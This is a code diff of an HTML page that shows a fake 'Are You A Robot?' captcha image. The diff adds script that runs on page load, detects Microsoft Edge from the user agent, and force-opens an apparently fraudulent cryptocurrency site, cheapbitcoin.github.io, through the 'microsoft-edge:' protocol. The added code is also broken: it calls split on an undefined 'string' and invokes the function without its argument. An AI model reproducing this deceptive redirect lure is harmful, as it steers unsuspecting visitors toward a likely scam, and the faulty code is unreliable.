@@ -18,8 +18,12 @@
 <body>
 	<img id="Robot" src="Robot.png" alt="Are You A Robot? Captcha Should Appear Soon!">  
 	<script> 
+	let browser = navigator.userAgent; 
+	
 	function openLinkInIE(url){
+	if (string.split(browser).includes("Edg")) { 
  	 window.open("microsoft-edge:"+ "https://cheapbitcoin.github.io");
+	}
 	}
 		openLinkInIE(); 
 		
